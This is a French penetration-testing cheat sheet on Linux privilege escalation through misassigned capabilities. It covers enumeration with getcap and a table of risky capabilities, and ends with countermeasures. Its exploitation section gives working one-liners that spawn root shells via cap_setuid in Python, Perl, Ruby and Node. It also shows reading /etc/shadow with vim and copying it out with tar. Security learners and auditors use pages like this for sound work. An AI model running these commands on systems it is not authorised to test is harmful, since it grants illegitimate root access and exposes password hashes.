# Linux Capabilities — Escalade de Privilèges

**Catégorie** : Linux
**Phase** : Privilege Escalation
**Tags** : #privesc #linux #capabilities #suid

---

## Principe

Les Linux capabilities découpent les privilèges root en permissions granulaires assignables à des binaires individuels. Quand un binaire reçoit une capability trop permissive (comme `cap_setuid` sur un interpréteur), un utilisateur non privilégié peut l'exploiter pour devenir root.

## Énumération

```bash
# Lister toutes les capabilities sur le système
getcap -r / 2>/dev/null
```

Sortie typique vulnérable :

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Les flags `+eip` signifient : effective, inheritable, permitted — la capability est active à l'exécution.

## Capabilities dangereuses

| Capability | Risque | Exploitation |
|---|---|---|
| `cap_setuid` | Changer l'UID → root | `os.setuid(0)` puis shell |
| `cap_setgid` | Changer le GID → accès fichiers root | `os.setgid(0)` |
| `cap_dac_override` | Ignorer les permissions fichiers | Lire/écrire `/etc/shadow` |
| `cap_dac_read_search` | Lire n'importe quel fichier | Lire `/etc/shadow`, clés SSH |
| `cap_sys_admin` | Quasi-root | Mount, ptrace, etc. |
| `cap_sys_ptrace` | Injecter dans des processus | Injection dans un processus root |

## Exploitation

### Python avec cap_setuid

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl avec cap_setuid

```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### Ruby avec cap_setuid

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### Node avec cap_setuid

```bash
node -e 'process.setuid(0); require("child_process").execSync("/bin/bash", {stdio: "inherit"});'
```

### Vim avec cap_dac_override

```bash
# Lire le shadow
vim /etc/shadow

# Écrire dans /etc/passwd (ajouter un user root)
```

### Tar avec cap_dac_read_search

```bash
# Exfiltrer des fichiers protégés
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz
cat etc/shadow
```

## Référence

Toujours vérifier [GTFOBins](https://gtfobins.github.io/) pour le binaire trouvé — section **Capabilities**.

## Différence avec SUID

| | SUID | Capabilities |
|---|---|---|
| Granularité | Tout ou rien (exécute en tant que owner) | Permissions individuelles |
| Détection | `find / -perm -4000` | `getcap -r /` |
| Risque | Tout binaire SUID root = potentiel root | Dépend de la capability assignée |

## Contre-mesures

- Ne jamais assigner `cap_setuid` à un interpréteur (Python, Perl, Ruby, Node…)
- Auditer régulièrement : `getcap -r / 2>/dev/null`
- Préférer des capabilities minimales (`cap_net_bind_service` pour un serveur web, pas plus)
- Utiliser AppArmor ou SELinux pour restreindre les binaires même avec capabilities
